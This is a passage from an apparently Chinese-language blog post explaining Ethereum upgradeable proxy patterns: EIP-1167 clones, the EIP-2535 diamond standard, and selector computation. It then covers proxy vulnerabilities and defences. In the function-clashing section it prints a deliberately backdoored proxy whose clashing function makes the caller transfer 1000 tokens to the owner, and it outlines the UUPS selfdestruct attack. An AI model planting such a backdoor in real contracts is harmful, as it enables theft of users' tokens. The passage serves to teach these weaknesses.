mstore(add(ptr, 0x38), deployer)<br>            mstore(add(ptr, 0x24), 0x5af43d82803e903d91602b57fd5bf3ff)<br>            mstore(add(ptr, 0x14), implementation)<br>            mstore(ptr, 0x3d602d80600a3d3981f3363d3d373d3d3d363d73)<br>            mstore(add(ptr, 0x58), salt)<br>            mstore(add(ptr, 0x78), keccak256(add(ptr, 0x0c), 0x37))<br>            predicted := keccak256(add(ptr, 0x43), 0x55)<br>        &#125;<br>    &#125;<br><br>    /**<br>     * @dev Computes the address of a clone deployed using &#123;Clones-cloneDeterministic&#125;.<br>     */<br>    // 计算使用 &#123;Clones-cloneDeterministic&#125; 部署的克隆的地址。<br>    function predictDeterministicAddress(address implementation, bytes32 salt)<br>        internal<br>        view<br>        returns (address predicted)<br>    &#123;<br>        return predictDeterministicAddress(implementation, salt, address(this));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>虽然通过<code>delegatecall</code>的方式将外部对代理合约的调用全部转接到远程合约上，省去了部署一次合约的开销，但是它存在以下问题：</p>
+<ul>
+<li>代理合约只拷贝了远程合约的runtime code，由于涉及初始化部分的代码在init code中，故代理合约无法拷贝远程合约的构造函数内的内容，需要一个额外的initialize 函数来初始化代理合约的状态值。</li>
+<li><code>delegatecall</code>只能调用public 或者 external的方法，对于其internal 和 private 方法无法调用。所以代理合约相当于只拷贝了远程合约的公开的方法。</li>
+</ul>
+<p>您可能听说过<a target="_blank" rel="noopener" href="https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7">parity multisig wallet hack</a>。有多个代理（不是 EIP1167）引用相同的实现。但是，钱包具有自毁功能，可以清空合约的存储空间和代码。不幸的是，Parity 钱包的访问控制存在一个错误，有人意外获得了原始实现的所有权。那并没有直接从其他平价钱包中窃取资产，但随后黑客删除了原始实现，使所有剩余的钱包成为没有功能的外壳，并将资产永久锁定在其中。</p>
+<h4 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h4><p>我们需要以下合约:</p>
+<ul>
+<li>实现：这是我们的逻辑所在的地方，我们将其称为Implementation.sol。</li>
+<li>CloneFactory：这将是我们的工厂，我们将有一个clone() 函数，用户将触发该函数，工厂将输出代理的地址。工厂的名称将是CloneFactory.sol。</li>
+<li>代理：与代理无关，代理将是CloneFactory.sol 中的clone() 函数的输出。可以有尽可能多的不同代理，这就是整个目的，以创建许多Implementation.sol的克隆。</li>
+</ul>
+<p>逻辑合约</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity &gt;= 0.8.0 &lt; 0.9.0;<br><br>contract Implementation &#123;<br>    uint public x;<br>    bool public isBase;<br>    address public owner;<br><br>    modifier onlyOwner() &#123;<br>        require(msg.sender == owner,&quot;ERROR: Only Owner&quot;);<br><br>        _;<br>    &#125;<br><br>    // 逻辑合约的构造函数应该是无参的<br>    constructor() &#123;<br>        isBase = true;<br>    &#125;<br><br>    // 一旦创建代理克隆，需要立即调用 initialize 函数<br>    function initialize(address _owner) external &#123;<br>        // 保证该合约只用于逻辑，不会被初始化（代理或者克隆合约不知道构造函数）<br>        require(isBase == false,&quot;ERROR: This the base contract, cannot initialize&quot;);<br>        // 确保 initialize 函数只被调用一次<br>        require(owner == address(0),&quot;ERROR: Contract already initialized&quot;);<br>        owner = _owner;<br>    &#125;<br><br>    function setX(uint _newX) external onlyOwner &#123;<br>        x = _newX;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>CloneFactory</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity &gt;= 0.8.0 &lt; 0.9.0;<br><br>interface Implementation &#123;<br>    function initialize(address _owner) external;<br>&#125;<br><br>contract CloneFactory &#123;<br>    // 逻辑合约的地址<br>    address public implementation;<br>    // 跟踪所有已部署克隆的映射<br>    mapping(address =&gt; address[]) public allClones;<br>    event NewClone(address _newClone, address _owner);<br><br>    constructor(address _imlementation) &#123;<br>        implementation = _imlementation;<br>    &#125;<br><br>    // 来自 Open Zeppelin，用于动态创建代理合约并返回新合约的地址<br>    function clone(address _imlementation) internal returns (address instance) &#123;<br>        assembly &#123;<br>            let ptr := mload(0x40)<br>            mstore(ptr, 0x3d602d80600a3d3981f3363d3d373d3d3d363d73000000000000000000000000)//32 bytes<br>            mstore(add(ptr, 0x14), shl(0x60, _imlementation)) //20bytes<br>            mstore(add(ptr, 0x28), 0x5af43d82803e903d91602b57fd5bf30000000000000000000000000000000000)//32 bytes<br>            instance := create(0, ptr, 0x37)<br>        &#125;<br>        require(instance != address(0),&quot;ERC1167: create failed&quot;);<br>    &#125;<br><br>    // 这是用户需要调用的函数<br>    function _clone() external &#123;<br>        address identicalChild = clone(implementation);<br>        allClones[msg.sender].push(identicalChild);<br>        // 这将使 _clone() 函数的调用者成为克隆合约的所有者。<br>        Implementation(identicalChild).initialize(msg.sender);<br>        emit NewClone(identicalChild,msg.sender);<br>    &#125;<br><br>    function returnClones(address _owner) external view returns (address[] memory) &#123;<br>        return allClones[_owner];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="EIP2535"><a href="#EIP2535" class="headerlink" title="EIP2535"></a>EIP2535</h3><h4 id="钻石协议"><a href="#钻石协议" class="headerlink" title="钻石协议"></a>钻石协议</h4><p>EIP-2535 取代了 <a target="_blank" rel="noopener" href="https://ethereum-blockchain-developer.com/110-upgrade-smart-contracts/10-eip-1538-transparent-contract-standard/">EIP-1538</a></p>
+<p><a target="_blank" rel="noopener" href="https://eips.ethereum.org/EIPS/eip-2535">EIP-2535官方文档</a></p>
+<p><a target="_blank" rel="noopener" href="https://soliditydeveloper.com/eip-2535">EIP-2535：组织和升级模块化智能合约系统的标准</a></p>
+<p><a target="_blank" rel="noopener" href="https://eip2535diamonds.substack.com/p/introduction-to-the-diamond-standard">钻石简介</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.quicknode.com/guides/smart-contract-development/the-diamond-standard-eip-2535-explained-part-1">实现指南</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/mudgen/diamond">参考实现</a></p>
+<p>使用普通的代理模式，我们可以有效地升级智能合约，但它有一些限制。</p>
+<ul>
+<li>如果您只想升级复杂合约的一小部分怎么办？你仍然需要升级到一个全新的逻辑合约。这使得更难看出实际发生了什么变化。</li>
+<li>多个代理可以重用逻辑合约，但不是很实用。您只能使用一个逻辑合约创建相同的代理实例。无法组合逻辑合约或仅使用其中的一部分。</li>
+<li>您不能拥有模块化的权限系统，例如允许某些实体仅升级现有功能的子集。相反，这是一种全有或全无的方法。</li>
+<li>在升级后访问逻辑合约中的数据时必须特别小心，因为代理合约中的数据永远不会随着升级而改变。这意味着如果您要停止在逻辑合约中使用状态变量，您仍然需要将其保留在变量定义中。当您添加状态变量时，您只能将它们附加到定义的末尾。</li>
+<li>逻辑合约可以轻松达到 24kb 的最大合约大小限制。</li>
+</ul>
+<p>Diamond 标准是最终确定的以太坊改进提案 ( <a target="_blank" rel="noopener" href="https://eips.ethereum.org/EIPS/eip-2535">EIP-2535</a> )，旨在使开发人员更容易模块化和升级他们的智能合约。Diamond 标准的核心思想类似于可升级的智能合约，例如代理模式，但好处是您可以从单个 Diamond 合约（即代理合约）控制许多实施合约（即逻辑合约）。钻石标准的一些主要特点包括：</p>
+<ul>
+<li>对n个实现合约进行代理调用的单个网关</li>
+<li>以原子方式升级单个或多个智能合约</li>
+<li>您可以添加到 Diamond 的实施合同数量没有存储限制</li>
+<li>在 Diamond 上进行的所有升级的日志历史记录</li>
+<li>可以降低gas成本（即通过减少外部函数调用的次数）</li>
+</ul>
+<p>Diamond 合约的三个核心组件包括 DiamondCut、DiamondStorage 以及标准函数和事件，它们允许您查看 Diamond 中的内容以及升级时间。一些已实施 Diamond 标准的协议包括<a target="_blank" rel="noopener" href="https://www.aavegotchi.com/">Aavegotchi</a>、<a target="_blank" rel="noopener" href="https://barnbridge.com/">BarnBridge</a>、<a target="_blank" rel="noopener" href="https://derivadex.com/">DerivaDEX</a>和<a target="_blank" rel="noopener" href="https://oncyber.io/">Oncyber</a>。</p>
+<p>此外，还有不同类型的钻石，例如：</p>
+<ul>
+<li><strong>可升级钻石</strong>：可以升级的可变合约</li>
+<li><strong>Finished Diamond</strong> : 由于可升级功能被删除，因此不可变合约</li>
+<li><strong>单切钻石</strong>：不可再升级的不可变合约</li>
+</ul>
+<h4 id="DiamondCut：管理界面"><a href="#DiamondCut：管理界面" class="headerlink" title="DiamondCut：管理界面"></a>DiamondCut：管理界面</h4><p>钻石存储必须实现该<code>diamondCut</code>功能。使用此功能，您可以（取消）注册特定逻辑合约的功能。注册函数后，菱形存储可以识别其回退函数中任何调用的函数选择器，检索正确的构面地址，然后为其运行委托调用。</p>
+<p>函数选择器冲突是可能的，这意味着两个不同的函数会产生相同的 4 字节函数签名。这很容易通过一个简单的检查来防止，该检查防止添加已经存在的功能选择器。钻石参考实现在升级时执行此检查。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs solidity">interface IDiamondCut &#123;<br>    enum FacetCutAction &#123;Add, Replace, Remove&#125;<br><br>    struct FacetCut &#123;<br>        address facetAddress;<br>        FacetCutAction action;<br>        bytes4[] functionSelectors;<br>    &#125;<br><br>    function diamondCut(<br>        FacetCut[] calldata _diamondCut,<br>        address _init,<br>        bytes calldata _calldata<br>    ) external;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="DiamondStorage：数据保管者"><a href="#DiamondStorage：数据保管者" class="headerlink" title="DiamondStorage：数据保管者"></a>DiamondStorage：数据保管者</h4><p>为了避免任何存储槽冲突，我们可以使用一个简单的技巧来存储数据。虽然通常 Solidity 会将数据存储在由状态变量定义的后续槽中，但我们也可以使用程序集显式设置存储槽。</p>
+<p>这样做时，我们只需要确保存储槽位于一个不会与其他方面产生冲突的唯一位置。通过散列构面名称可以轻松实现这一点。</p>
+<p>现在每当我们想读或写<code>FacetData</code>时，我们不必担心覆盖其他方面的数据，因为我们的存储槽位置是唯一的。当然，您也可以从任何其他方面访问这些数据，您只需要继承<code>FacetA</code>并使用该<code>facetData</code>功能。这就是为什么它对创建可重用的构面特别有帮助。</p>
+<p>然而，另一种设计是<a target="_blank" rel="noopener" href="https://dev.to/mudgen/appstorage-pattern-for-state-variables-in-solidity-3lki">AppStorage 模式</a>，我们不会在这里详细介绍，但它牺牲了可重用性以略微提高代码可读性。AppStorage 在特定于项目的方面之间共享状态变量时非常有用，并且不会在菱形中用于其他项目或协议。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract FacetA &#123;<br>  struct FacetData &#123;<br>    address owner;<br>    bytes32 dataA;<br>  &#125;<br><br>  function facetData()<br>    internal<br>    pure<br>    returns(FacetData storage facetData) &#123;<br>    bytes32 storagePosition = keccak256(&quot;diamond.storage.FacetA&quot;);<br>    assembly &#123;facetData.slot := storagePosition&#125;<br>  &#125;<br><br>  function setDataA(bytes32 _dataA) external &#123;<br>    FacetData storage facetData = facetData();<br>    require(facetData.owner == msg.sender, &quot;Must be owner.&quot;);<br>    facetData.dataA = _dataA;<br>  &#125;<br><br>  function getDataA() external view returns (bytes32) &#123;<br>    return facetData().dataA;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="DiamondLoupe：找出支持的功能"><a href="#DiamondLoupe：找出支持的功能" class="headerlink" title="DiamondLoupe：找出支持的功能"></a>DiamondLoupe：找出支持的功能</h4><p>DiamondLoupe 帮助我们了解 Diamond 合约中的 Facets、函数选择器和 facet 地址所指向的内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">interface IDiamondLoupe &#123;<br>  struct Facet &#123;<br>    address facetAddress;<br>    bytes4[] functionSelectors;<br>  &#125;<br><br>  function facets() external view returns (Facet[] memory facets_);<br>  function facetFunctionSelectors(address _facet) external view returns (bytes4[] memory facetFunctionSelectors_);<br>  function facetAddresses() external view returns (address[] memory facetAddresses_);<br>  function facetAddress(bytes4 _functionSelector) external view returns (address facetAddress_);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p>目前没有通过 Openzeppelin 合约提供的参考实现，但它<a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/openzeppelin-contracts/issues/2793">可能</a>很快就会发生。EIP 作者<a target="_blank" rel="noopener" href="http://www.perfectabstractions.com/">Nick Mudge</a>创建了<a target="_blank" rel="noopener" href="https://github.com/mudgen/diamond">三个</a><a target="_blank" rel="noopener" href="https://eip2535diamonds.substack.com/p/smart-contract-security-audits-for">经过审计</a> 的参考实现：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/mudgen/diamond-1-hardhat">diamond-1-hardhat</a>（简单实现）</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/mudgen/diamond-2-hardhat">diamond-2-hardhat</a>（气体优化）</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/mudgen/diamond-3-hardhat">diamond-3-hard</a>（简单放大镜功能）</li>
+</ul>
+<p>你应该选择哪一个？他们都做同样的事情，所以这并不重要。如果您计划进行多次升级并关心汽油成本，请考虑使用 diamond-2。它包含一些复杂的按位运算来减少存储空间，每添加 20 个函数将为您节省大约 80,000 个 gas。否则， diamond-1 可能是更好的选择，因为代码更具可读性。</p>
+<h2 id="检测是否是代理"><a href="#检测是否是代理" class="headerlink" title="检测是否是代理"></a>检测是否是代理</h2><p>在许多情况下，EtherScan 可以检测合约是否被代理：</p>
+<p><a target="_blank" rel="noopener" href="https://medium.com/etherscan-blog/and-finally-proxy-contract-support-on-etherscan-693e3da0714b">https://medium.com/etherscan-blog/and-finally-proxy-contract-support-on-etherscan-693e3da0714b</a></p>
+<p><a target="_blank" rel="noopener" href="https://etherscan.io/proxyContractChecker">https://etherscan.io/proxyContractChecker</a></p>
+<p>在 EtherScan 上查看合约时，在“合约”选项卡下，如果 Etherscan 知道合约被代理，那么您将不仅有“读取合约”和“写入合约”，还有“通过代理读取合约”和“写入合约”通过代理”或类似的。</p>
+<p>如果代理代码已更新，Etherscan 将向您显示代码的先前版本的合约地址，以便用户可以检查所有版本的更改。</p>
+<h2 id="函数冲突"><a href="#函数冲突" class="headerlink" title="函数冲突"></a>函数冲突</h2><p><a target="_blank" rel="noopener" href="https://forum.openzeppelin.com/t/beware-of-the-proxy-learn-how-to-exploit-function-clashing/1070">当心代理：学习如何利用函数冲突</a></p>
+<p><a target="_blank" rel="noopener" href="https://medium.com/nomic-foundation-blog/malicious-backdoors-in-ethereum-proxies-62629adf3357">函数冲突解释</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/tinchoabbate/function-clashing-poc">复现</a></p>
+<p><a target="_blank" rel="noopener" href="https://ropsten.etherscan.io/address/0xb97dd0102bb67f81d25d686c661d7f0aed62e344#code">测试</a> 和 <a target="_blank" rel="noopener" href="https://gist.github.com/ripwu/d1c99c3de2215bbcb2a51c2f6fda8ca9">题解</a></p>
+<h3 id="函数选择器"><a href="#函数选择器" class="headerlink" title="函数选择器"></a>函数选择器</h3><p>[在以太坊虚拟机中] 每个函数都由其 Keccak-256 哈希的前 4 个字节标识。通过将函数的名称和它接受的参数放入 keccak256 哈希函数中，我们可以推断出它的函数标识符。</p>
+<p>solidity 计算函数选择器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">abi.encodeWithSignature(&quot;store(uint256)&quot;,10)<br></code></pre></td></tr></table></figure>
+
+<p>ethers.js 计算函数选择器</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> ethers = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;ethers&#x27;</span>)<br><br><span class="hljs-comment">//函数功能: 计算函数选择器</span><br><span class="hljs-comment">//input: funcHead 是函数头部申明，去掉&quot;&quot;funcion&quot;关键字，去掉参数名字，只</span><br><span class="hljs-comment">//          保留函数名+参数类型，去掉所有的空格</span><br><span class="hljs-comment">//return: 返回4个字节的字符串</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFunctionSeletor</span>(<span class="hljs-params">funcHead</span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> ethers.utils.id(funcHead).slice(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doMain</span>(<span class="hljs-params"></span>) </span>&#123;<br>	<span class="hljs-comment">//1)计算函数选择器</span><br>	<span class="hljs-comment">//原函数：function allowance(address owner, address spender)</span><br>	<span class="hljs-comment">//精简化: allowance(address,address)</span><br>	strfunc = <span class="hljs-string">&#x27;allowance(address,address)&#x27;</span><br>	funcSeletor = getFunctionSeletor(strfunc)<br>	res = strfunc + <span class="hljs-string">&#x27;=&#x27;</span><br>	<span class="hljs-built_in">console</span>.log(res,funcSeletor)<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>ethers.js 计算事件选择器</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> ethers = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;ethers&#x27;</span>)<br><br><span class="hljs-comment">//函数功能: 计算事件选择器</span><br><span class="hljs-comment">//input: eventHead 是事件头部申明，去掉&quot;&quot;event&quot;关键字，去掉参数名字，只</span><br><span class="hljs-comment">//          保留事件名+参数类型，去掉所有的空格</span><br><span class="hljs-comment">//return: 返回32个字节的字符串</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getEventSelector</span>(<span class="hljs-params">eventHead</span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> ethers.utils.id(eventHead)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doMain</span>(<span class="hljs-params"></span>) </span>&#123;<br>     <span class="hljs-comment">//2) 计算事件选择器</span><br>    <span class="hljs-comment">//原事件: event Approval(address owner, address spender, uint256 value)</span><br>    <span class="hljs-comment">//精简化: Approval(address,address,uint256)</span><br>    strEvent = <span class="hljs-string">&#x27;Approval(address,address,uint256)&#x27;</span><br>    eventSelector = getEventSelector(strEvent)<br>    res2 = strEvent + <span class="hljs-string">&#x27;=&#x27;</span><br>    <span class="hljs-built_in">console</span>.log(res2,eventSelector)<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="冲突"><a href="#冲突" class="headerlink" title="冲突"></a>冲突</h3><p>这里是一个有问题的代理合约</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.5.0;<br><br>contract Proxy &#123;<br>    <br>    address public proxyOwner;<br>    address public implementation;<br><br>    constructor(address implementation) public &#123;<br>        proxyOwner = msg.sender;<br>        _setImplementation(implementation);<br>    &#125;<br><br>    modifier onlyProxyOwner() &#123;<br>        require(msg.sender == proxyOwner);<br>        _;<br>    &#125;<br><br>    function upgrade(address implementation) external onlyProxyOwner &#123;<br>        _setImplementation(implementation);<br>    &#125;<br><br>    function _setImplementation(address imp) private &#123;<br>        implementation = imp;<br>    &#125;<br><br>    function () payable external &#123;<br>        address impl = implementation;<br><br>        assembly &#123;<br>            calldatacopy(0, 0, calldatasize)<br>            let result := delegatecall(gas, impl, 0, calldatasize, 0, 0)<br>            returndatacopy(0, 0, returndatasize)<br><br>            switch result<br>            case 0 &#123; revert(0, returndatasize) &#125;<br>            default &#123; return(0, returndatasize) &#125;<br>        &#125;<br>    &#125;<br>    <br>    // This is the function we&#x27;re adding now<br>    function collate_propagate_storage(bytes16) external &#123;<br>        implementation.delegatecall(abi.encodeWithSignature(<br>            &quot;transfer(address,uint256)&quot;, proxyOwner, 1000<br>        ));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里的 collate_propagate_storage(bytes16) 和 burn(uint256) 的函数选择器完全相同，都为 0x42966c68</p>
+<p>由于 burn 调用是通过代理完成的，<strong>因此 EVM 将首先检查代理代码中是否有标识符与 0x42966c68 匹配的函数</strong>。 如果没有，则将执行代理的回退函数并将调用委托给存储在实现中的地址。</p>
+<p>但是，在这种情况下，代理确实包含一个标识符与<code>0x42966c68</code>:匹配的函数<code>collate_propagate_storage(bytes16)</code>。结果，它被执行了。</p>
+<p>让我们记住它的样子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function collate_propagate_storage(bytes16) external &#123;<br>   implementation.delegatecall(abi.encodeWithSignature(<br>       &quot;transfer(address,uint256)&quot;, proxyOwner, 1000<br>   ));<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>所以<strong>该函数实际上会强制调用者将</strong> <code>transfer</code> <strong>1000 个令牌交给代理的所有者！</strong>.</p>
+<p><img src="/2022/11/13/upgradeable/473b432f25d2060d65f16d75435d1aa7dce2a058.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>用户只想烧掉一个代币，结果却少了 1000 个代币。</p>
+<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/trailofbits/slither">Slither</a> 有一个非常好的<a target="_blank" rel="noopener" href="https://github.com/trailofbits/slither/wiki/Upgradeability-Checks">插件</a>，它可以立即检测两个合约（代理和实现）之间的功能冲突。</li>
+<li>此漏洞现在已经不会发生，因为<a target="_blank" rel="noopener" href="https://blog.openzeppelin.com/the-state-of-smart-contract-upgrades/#transparent-proxies">透明代理模式</a>解决了这个问题</li>
+</ul>
+<h2 id="未初始化"><a href="#未初始化" class="headerlink" title="未初始化"></a>未初始化</h2><p>逻辑合约未初始化，且含有 selfdestruct 函数</p>
+<p>也就是一种拒绝服务 (DOS) 攻击</p>
+<p><a target="_blank" rel="noopener" href="https://sissice.github.io/2022/10/03/ParadigmCTF2021three/">Paradigm CTF 2021 - vault</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/275550#h3-7">Wormhole的实际漏洞情况</a></p>
+<h3 id="UUPS中的漏洞分析"><a href="#UUPS中的漏洞分析" class="headerlink" title="UUPS中的漏洞分析"></a>UUPS中的漏洞分析</h3><p><a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-5vp3-v4hc-gx76">官方公告</a></p>
+<p><a target="_blank" rel="noopener" href="https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680">UUPSUpgradeable 漏洞事后分析</a></p>
+<p>该漏洞存在于升级函数中的 DELEGATECALL 指令中，由 UUPSUpgradeable 基础合约暴露。<a target="_blank" rel="noopener" href="https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable#potentially-unsafe-operations">如此处</a>所述<a target="_blank" rel="noopener" href="https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable#potentially-unsafe-operations"> 83</a>, a<code>DELEGATECALL</code>可以被攻击者利用，方法是让实施合约调用另一个<code>SELFDESTRUCT</code>本身为 s 的合约，导致调用者被销毁。</p>
+<p>给定一个 UUPS 实现合约，攻击者可以<a target="_blank" rel="noopener" href="https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable#initializers">初始化它 88</a>并指定自己为升级管理员。这允许他们调用<a target="_blank" rel="noopener" href="https://docs.openzeppelin.com/contracts/4.x/api/proxy#UUPSUpgradeable-upgradeToAndCall-address-bytes-"><code>upgradeToAndCall</code> 42</a>直接在实现上运行，而不是在代理上运行，并将其用于<code>DELEGATECALL</code>带有<code>SELFDESTRUCT</code>操作的恶意合约。</p>
+<p>如果攻击成功，则此实现支持的任何代理合约都将无法使用，因为对它们的任何调用都会委托给一个没有可执行代码的地址。此外，由于升级逻辑驻留在实现中而不是代理中，因此不可能将代理升级到有效的实现。这有效地破坏了合约，并阻碍了对其持有的任何资产的访问。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/yehjxraymond/exploding-kitten">漏洞利用的工作概念证明</a></p>
+<p><strong>问题合约</strong></p>
